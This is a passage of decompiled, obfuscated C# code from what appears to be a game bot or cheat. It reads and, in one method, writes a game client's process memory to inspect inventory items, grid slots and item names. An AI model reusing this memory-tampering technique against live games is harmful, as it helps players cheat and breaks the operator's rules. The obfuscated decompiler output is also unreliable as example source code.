using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using ns1;
using ns10;
using ns100;
using ns11;
using ns23;
using ns35;
using ns44;
using ns53;
using ns71;
using ns85;
using ns88;

namespace ns81;

internal class Class85
{
	public static bool bool_0 = false;

	public static uint uint_0 = 48u;

	public static uint uint_1 = 16u;

	public bool bool_1 = false;

	public static bool bool_2 = false;

	public static string string_0;

	public static void smethod_0(CharacterAccountConfig characterAccountConfig_0, int int_0, uint uint_2 = 0u, uint uint_3 = 0u)
	{
		if (uint_3 == 0)
		{
			uint_3 = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig_0.int_137) + Class56.memorySignatureScanConfig_97.uint_0;
		}
		Class24.smethod_31((uint)(uint_3 + int_0 * 20 + Class56.memorySignatureScanConfig_101.uint_0), characterAccountConfig_0.int_137, uint_2);
	}

	public static uint smethod_1(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		int int_ = 0;
		byte[] array = new byte[4];
		uint num = 0u;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array, 0);
		if (num2 != 0 && Class56.memorySignatureScanConfig_97.uint_0 != 0)
		{
			uint num3 = num2 + Class56.memorySignatureScanConfig_97.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, characterAccountConfig_0.uint_20 + uint_2 * 4, array, 4, ref int_);
			num = BitConverter.ToUInt32(array, 0);
			if (num != 0)
			{
				uint num4 = num * 5 + Class56.memorySignatureScanConfig_99.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num3 + num4 * 4, array, 4, ref int_);
				int num5 = BitConverter.ToInt32(array, 0);
				if (num5 == uint_2)
				{
					return num;
				}
			}
			uint num6 = num3 + Class56.memorySignatureScanConfig_98.uint_0;
			uint num7 = 0u;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + 8, array, 4, ref int_);
			uint num8 = BitConverter.ToUInt32(array, 0);
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6, array, 4, ref int_);
			uint num9 = BitConverter.ToUInt32(array, 0);
			num = 0u;
			while (num7 < num8 && num9 != 0)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + num7 * 8 + 4, array, 4, ref int_);
				num7 = BitConverter.ToUInt32(array, 0);
				if (num7 == 0)
				{
					break;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num3 + (num7 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array, 4, ref int_);
				uint num10 = BitConverter.ToUInt32(array, 0);
				if (num10 == uint_2)
				{
					num = num7;
					break;
				}
			}
		}
		array = BitConverter.GetBytes(num);
		Class24.WriteProcessMemory(characterAccountConfig_0.int_137, characterAccountConfig_0.uint_20 + uint_2 * 4, array, 4, ref int_);
		return num;
	}

	public static uint smethod_2(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		int int_ = 0;
		byte[] array = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array, 4, ref int_);
		uint num = BitConverter.ToUInt32(array, 0);
		uint num2 = num + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (uint_2 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array, 4, ref int_);
		return BitConverter.ToUInt32(array, 0);
	}

	public static bool smethod_3(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num == 0)
		{
			return false;
		}
		uint num2 = num + uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
		uint uint_3 = num2 + Class56.memorySignatureScanConfig_106.uint_0 - 4;
		uint num3 = Class24.smethod_30(uint_3, characterAccountConfig_0.int_137);
		return num3 == 0;
	}

	public static int smethod_4(CharacterAccountConfig characterAccountConfig_0)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig_0.int_137) + Class56.memorySignatureScanConfig_97.uint_0;
		uint num2 = num + Class56.memorySignatureScanConfig_98.uint_0;
		return (int)Class24.smethod_30(num2 + 4, characterAccountConfig_0.int_137);
	}

	public static uint smethod_5(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig_0.int_137);
		if (num == 0)
		{
			return 0u;
		}
		return Class24.smethod_30(num + Class56.memorySignatureScanConfig_97.uint_0 + uint_2 * 20 + Class56.memorySignatureScanConfig_100.uint_0 - 8, characterAccountConfig_0.int_137);
	}

	public static uint smethod_6(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig_0.int_137);
		if (num != 0)
		{
			return Class24.smethod_30(num + Class56.memorySignatureScanConfig_97.uint_0 + uint_2 * 20 + Class56.memorySignatureScanConfig_100.uint_0 - 4, characterAccountConfig_0.int_137);
		}
		return 0u;
	}

	public static uint smethod_7(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig_0.int_137);
		if (num == 0)
		{
			return 0u;
		}
		return Class24.smethod_30(num + Class56.memorySignatureScanConfig_97.uint_0 + uint_2 * 20 + Class56.memorySignatureScanConfig_100.uint_0, characterAccountConfig_0.int_137);
	}

	public static string smethod_8(CharacterAccountConfig characterAccountConfig_0, uint uint_2, uint uint_3 = 0u, bool bool_3 = false, int int_0 = 48)
	{
		uint_3 = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (uint_3 == 0)
		{
			return string.Empty;
		}
		uint num = uint_3 + uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
		if (Class24.smethod_30(num + Class56.memorySignatureScanConfig_106.uint_0 - 4, characterAccountConfig_0.int_137) == 0)
		{
			string text = Class24.smethod_28(num + Class56.memorySignatureScanConfig_107.uint_0, characterAccountConfig_0.int_137, int_0);
			if (bool_3 && text != string.Empty)
			{
				text = Class1.smethod_1(text, 1);
			}
			return text;
		}
		return string.Empty;
	}

	public static int smethod_9(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		if (Class56.memorySignatureScanConfig_108.uint_0 == 0)
		{
			return 0;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num != 0)
		{
			num += uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
			return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_108.uint_0, characterAccountConfig_0.int_137);
		}
		return 0;
	}

	public static int smethod_10(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		if (Class56.memorySignatureScanConfig_109.uint_0 == 0)
		{
			return 0;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num == 0)
		{
			return 0;
		}
		num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
		return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_109.uint_0, characterAccountConfig_0.int_137);
	}

	public static int smethod_11(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		if (Class56.memorySignatureScanConfig_110.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			if (num != 0)
			{
				num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
				return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_110.uint_0, characterAccountConfig_0.int_137);
			}
			return -1;
		}
		return -1;
	}

	public static uint smethod_12(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		if (Class56.memorySignatureScanConfig_111.uint_0 == 0)
		{
			return 0u;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num == 0)
		{
			return 0u;
		}
		num += uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
		return Class24.smethod_30(num + Class56.memorySignatureScanConfig_111.uint_0, characterAccountConfig_0.int_137);
	}

	public static uint smethod_13(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		if (Class56.memorySignatureScanConfig_112.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			if (num != 0)
			{
				num += uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
				return Class24.smethod_30(num + Class56.memorySignatureScanConfig_112.uint_0, characterAccountConfig_0.int_137);
			}
			return 0u;
		}
		return 0u;
	}

	public static int smethod_14(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num != 0)
		{
			num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
			return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_113.uint_0, characterAccountConfig_0.int_137);
		}
		return 0;
	}

	public static int smethod_15(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		if (Class56.memorySignatureScanConfig_114.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			if (num != 0)
			{
				num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
				return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_114.uint_0, characterAccountConfig_0.int_137);
			}
			return 0;
		}
		return 0;
	}

	public static int smethod_16(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		if (Class56.memorySignatureScanConfig_115.uint_0 == 0)
		{
			return 0;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num != 0)
		{
			num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
			return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_115.uint_0, characterAccountConfig_0.int_137);
		}
		return 0;
	}

	public static string smethod_17(CharacterAccountConfig characterAccountConfig_0, int int_0)
	{
		if (Class56.memorySignatureScanConfig_116.uint_0 == 0)
		{
			return string.Empty;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		if (num != 0)
		{
			num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
			return Class24.smethod_28(num + Class56.memorySignatureScanConfig_116.uint_0, characterAccountConfig_0.int_137, 255);
		}
		return string.Empty;
	}

	public static uint[] smethod_18(CharacterAccountConfig characterAccountConfig_0, int int_0, int int_1 = 0)
	{
		uint[] array = new uint[4];
		uint[] array2 = array;
		if (Class56.memorySignatureScanConfig_118.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			if (num == 0)
			{
				return array2;
			}
			num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
			array2[0] = Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_118.uint_0 + int_1 * 16), characterAccountConfig_0.int_137);
			array2[1] = Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_118.uint_0 + int_1 * 16 + 4L), characterAccountConfig_0.int_137);
			array2[2] = Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_118.uint_0 + int_1 * 16 + 8L), characterAccountConfig_0.int_137);
			array2[3] = Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_118.uint_0 + int_1 * 16 + 12L), characterAccountConfig_0.int_137);
			return array2;
		}
		return array2;
	}

	public static int[] smethod_19(CharacterAccountConfig characterAccountConfig_0, int int_0, int int_1 = 0)
	{
		int[] array = new int[4];
		int[] array2 = array;
		if (Class56.memorySignatureScanConfig_117.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			if (num == 0)
			{
				return array2;
			}
			num += (uint)(int_0 * (int)Class56.memorySignatureScanConfig_106.uint_0);
			array2[0] = (int)Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_117.uint_0 + int_1 * 16), characterAccountConfig_0.int_137);
			array2[1] = (int)Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_117.uint_0 + int_1 * 16 + 4L), characterAccountConfig_0.int_137);
			array2[2] = (int)Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_117.uint_0 + int_1 * 16 + 8L), characterAccountConfig_0.int_137);
			array2[3] = (int)Class24.smethod_30((uint)(num + Class56.memorySignatureScanConfig_117.uint_0 + int_1 * 16 + 12L), characterAccountConfig_0.int_137);
			return array2;
		}
		return array2;
	}

	public static int[] smethod_20(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		int[] array = new int[2];
		int[] array2 = array;
		if (Class56.memorySignatureScanConfig_119.uint_0 == 0)
		{
			return array2;
		}
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		uint num2 = num + uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
		array2[0] = (int)Class24.smethod_30(num2 + Class56.memorySignatureScanConfig_119.uint_0, characterAccountConfig_0.int_137);
		array2[1] = (int)Class24.smethod_30(num2 + Class56.memorySignatureScanConfig_119.uint_0 + 4, characterAccountConfig_0.int_137);
		return array2;
	}

	public static int smethod_21(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		if (Class56.memorySignatureScanConfig_120.uint_0 != 0)
		{
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
			num += uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
			return (int)Class24.smethod_30(num + Class56.memorySignatureScanConfig_120.uint_0, characterAccountConfig_0.int_137);
		}
		return 0;
	}

	public static bool smethod_22(CharacterAccountConfig characterAccountConfig_0)
	{
		int num = (int)Class24.smethod_30(Class56.memorySignatureScanConfig_123.uint_0, characterAccountConfig_0.int_137);
		return num > 0;
	}

	public static uint[] smethod_23(CharacterAccountConfig characterAccountConfig_0)
	{
		int int_ = 0;
		byte[] array = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_123.uint_0, array, 4, ref int_);
		if (BitConverter.ToInt32(array, 0) != 0)
		{
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array, 4, ref int_);
			uint num = BitConverter.ToUInt32(array, 0) + Class56.memorySignatureScanConfig_97.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array, 4, ref int_);
			uint num2 = BitConverter.ToUInt32(array, 0);
			int num3 = smethod_4(characterAccountConfig_0);
			int num4 = 0;
			for (uint num5 = 1u; num5 < Class56.int_1; num5++)
			{
				if (num3 <= num4)
				{
					break;
				}
				uint num6 = num + num5 * 20;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_99.uint_0 * 4, array, 4, ref int_);
				uint num7 = BitConverter.ToUInt32(array, 0);
				if (num7 == 0)
				{
					continue;
				}
				uint num8 = num2 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array, 4, ref int_);
				if (BitConverter.ToInt32(array, 0) != 0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
				if (array[0] != 0)
				{
					num4++;
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
					if (array[0] == 1)
					{
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_111.uint_0, array, 1, ref int_);
						uint num9 = array[0];
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_112.uint_0, array, 1, ref int_);
						uint num10 = array[0];
						return new uint[4] { num5, num7, num9, num10 };
					}
				}
			}
			return null;
		}
		return null;
	}

	public static int smethod_24(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint[] array = smethod_23(characterAccountConfig_0);
		if (array != null)
		{
			uint[] array2 = smethod_26(characterAccountConfig_0, uint_2, array[2], array[3]);
			if (array2 != null)
			{
				int num = 0;
				int int_ = 0;
				byte[] array3 = new byte[4];
				while (num < 100)
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_123.uint_0, array3, 4, ref int_);
					if (BitConverter.ToInt32(array3, 0) != 0)
					{
						if (num % 40 == 0)
						{
							Class75.smethod_46(characterAccountConfig_0, array2[0], array2[1], uint_2, array2[0], array2[1], uint_2);
						}
						num++;
						Thread.Sleep(10);
						continue;
					}
					return 1;
				}
				return -2;
			}
			return -1;
		}
		return 0;
	}

	public static int smethod_25(CharacterAccountConfig characterAccountConfig_0, uint uint_2 = 3u)
	{
		int[] array = Class47.smethod_0(uint_2);
		int num = array[0] * array[1];
		int int_ = 0;
		byte[] array2 = new byte[1];
		byte[] array3 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array3, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array3, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array3, 4, ref int_);
		uint num3 = BitConverter.ToUInt32(array3, 0);
		int num4 = smethod_4(characterAccountConfig_0);
		int num5 = 0;
		for (uint num6 = 1u; num6 < Class56.int_1; num6++)
		{
			if (num4 <= num5)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (num6 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array3, 4, ref int_);
			uint num7 = BitConverter.ToUInt32(array3, 0);
			if (num7 == 0)
			{
				continue;
			}
			uint num8 = num3 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array3, 4, ref int_);
			if (BitConverter.ToInt32(array3, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array2, 1, ref int_);
			if (array2[0] != 0)
			{
				num5++;
				uint num9 = num2 + num6 * 20;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array2, 1, ref int_);
				if (array2[0] == uint_2)
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_111.uint_0, array2, 1, ref int_);
					int num10 = array2[0];
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_112.uint_0, array2, 1, ref int_);
					int num11 = array2[0];
					num -= num10 * num11;
				}
			}
		}
		return num;
	}

	public static uint[] smethod_26(CharacterAccountConfig characterAccountConfig_0, uint uint_2, uint uint_3 = 1u, uint uint_4 = 1u)
	{
		int[] array = Class47.smethod_0(uint_2);
		int[,] array2 = new int[array[0], array[1]];
		int num = 0;
		int int_ = 0;
		byte[] array3 = new byte[1];
		byte[] array4 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array4, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array4, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array4, 4, ref int_);
		uint num3 = BitConverter.ToUInt32(array4, 0);
		int num4 = smethod_4(characterAccountConfig_0);
		int num5 = 0;
		for (uint num6 = 1u; num6 < Class56.int_1; num6++)
		{
			if (num4 <= num5)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (num6 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array4, 4, ref int_);
			uint num7 = BitConverter.ToUInt32(array4, 0);
			if (num7 == 0)
			{
				continue;
			}
			uint num8 = num3 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array4, 4, ref int_);
			if (BitConverter.ToInt32(array4, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array3, 1, ref int_);
			if (array3[0] == 0)
			{
				continue;
			}
			num5++;
			uint num9 = num2 + num6 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array3, 1, ref int_);
			if (array3[0] != uint_2)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 4, array3, 1, ref int_);
			int num10 = array3[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0, array3, 1, ref int_);
			int num11 = array3[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_111.uint_0, array3, 1, ref int_);
			int num12 = array3[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_112.uint_0, array3, 1, ref int_);
			int num13 = array3[0];
			if (num10 < 0 || num11 < 0 || num12 <= 0 || num13 <= 0)
			{
				continue;
			}
			num += num12 * num13;
			for (int i = 0; i < num12; i++)
			{
				for (int j = 0; j < num13; j++)
				{
					if (num10 + i < array[0] && num11 + j < array[1])
					{
						array2[num10 + i, num11 + j] = 1;
					}
				}
			}
		}
		if (array[0] * array[1] - num >= uint_3 * uint_4)
		{
			for (int k = 0; k < array[1]; k++)
			{
				for (int l = 0; l < array[0]; l++)
				{
					bool flag = true;
					for (int m = 0; m < uint_3; m++)
					{
						for (int n = 0; n < uint_4; n++)
						{
							if (l + m >= array[0] || k + n >= array[1] || array2[l + m, k + n] != 0)
							{
								flag = false;
								break;
							}
						}
						if (!flag)
						{
							break;
						}
					}
					if (flag)
					{
						return new uint[2]
						{
							(uint)l,
							(uint)k
						};
					}
				}
			}
		}
		return null;
	}

	public static int[,] smethod_27(CharacterAccountConfig characterAccountConfig_0)
	{
		int[,] array = new int[6, 10];
		int int_ = 0;
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		int[,] array3 = new int[8, 3];
		Class10.smethod_4(array3, 350581);
		int[,] array4 = array3;
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		for (uint num5 = 1u; num5 < Class56.int_1; num5++)
		{
			if (num3 <= num4)
			{
				break;
			}
			uint num6 = num + num5 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_99.uint_0 * 4, array2, 4, ref int_);
			uint num7 = BitConverter.ToUInt32(array2, 0);
			if (num7 == 0)
			{
				continue;
			}
			uint num8 = num2 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			num4++;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array2, 1, ref int_);
			if (array2[0] == 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array2, 4, ref int_);
			uint num9 = BitConverter.ToUInt32(array2, 0);
			if (num9 != 3)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 4, array2, 1, ref int_);
			int num10 = array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0, array2, 1, ref int_);
			int num11 = array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_111.uint_0, array2, 1, ref int_);
			int num12 = array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_112.uint_0, array2, 1, ref int_);
			int num13 = array2[0];
			for (int i = num10; i < num10 + num12; i++)
			{
				for (int j = num11; j < num11 + num13; j++)
				{
					if (i < 6 && j < 10)
					{
						array[i, j] = 1;
					}
				}
			}
		}
		int num14 = 0;
		for (int k = 0; k < 6; k++)
		{
			for (int l = 0; l < 10; l++)
			{
				if (array[k, l] > 0)
				{
					continue;
				}
				int num15 = 0;
				for (int m = 0; m < array4.GetLength(0); m++)
				{
					if (array4[m, 0] <= 0)
					{
						int num16 = array4[m, 1];
						int num17 = array4[m, 2];
						if (6 < k + num16 || 10 < l + num17)
						{
							continue;
						}
						int num18 = 1;
						for (int n = k; n < k + num16; n++)
						{
							int num19 = l;
							while (num19 < l + num17)
							{
								if (array[n, num19] <= 0)
								{
									num19++;
									continue;
								}
								goto IL_0315;
							}
							continue;
							IL_0315:
							num18 = 0;
							break;
						}
						if (num18 > 0)
						{
							array4[m, 0] = 1;
							num14++;
						}
					}
					else
					{
						num15++;
					}
				}
				if (num15 == array4.GetLength(0))
				{
					return array4;
				}
			}
		}
		if (num14 == 0)
		{
			array4[0, 0] = -2;
		}
		return array4;
	}

	public static uint smethod_28(CharacterAccountConfig characterAccountConfig_0, uint uint_2)
	{
		uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_105.uint_0, characterAccountConfig_0.int_137);
		uint num2 = uint_2 * Class56.memorySignatureScanConfig_106.uint_0;
		uint uint_3 = num + num2 + Class56.memorySignatureScanConfig_103.uint_0;
		return Class24.smethod_30(uint_3, characterAccountConfig_0.int_137);
	}

	public static uint[] smethod_29(CharacterAccountConfig characterAccountConfig_0, string string_1, int int_0 = 3, bool bool_3 = false)
	{
		if (string_1 != null)
		{
			int num = 1;
			string[] array = string_1.Split('|');
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == null)
				{
					array[i] = string.Empty;
				}
				if (num < array[i].Length)
				{
					num = array[i].Length;
				}
				array[i] = array[i].ToLower();
			}
			num += 4;
			int int_1 = 0;
			byte[] array2 = new byte[1];
			byte[] array3 = new byte[4];
			byte[] byte_ = new byte[num];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array3, 4, ref int_1);
			uint num2 = BitConverter.ToUInt32(array3, 0);
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array3, 4, ref int_1);
			uint num3 = BitConverter.ToUInt32(array3, 0) + Class56.memorySignatureScanConfig_97.uint_0;
			int num4 = smethod_4(characterAccountConfig_0);
			int num5 = 0;
			for (uint num6 = 1u; num6 < Class56.int_1; num6++)
			{
				if (num4 <= num5)
				{
					break;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num3 + (num6 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array3, 4, ref int_1);
				uint num7 = BitConverter.ToUInt32(array3, 0);
				if (num7 == 0)
				{
					continue;
				}
				uint num8 = num2 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array3, 4, ref int_1);
				if (BitConverter.ToInt32(array3, 0) != 0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array2, 1, ref int_1);
				if (array2[0] == 0)
				{
					continue;
				}
				num5++;
				uint num9 = num3 + num6 * 20;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array2, 1, ref int_1);
				uint num10 = array2[0];
				if (int_0 > 0 && num10 != int_0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, byte_, num, ref int_1);
				string text = Class1.smethod_3(byte_).ToLower();
				int length = text.Length;
				char[] array4 = text.ToCharArray();
				int num11 = array4.Length;
				for (int j = 0; j < array.Length; j++)
				{
					if (bool_3 && length != array[j].Length)
					{
						continue;
					}
					bool flag = true;
					char[] array5 = array[j].ToCharArray();
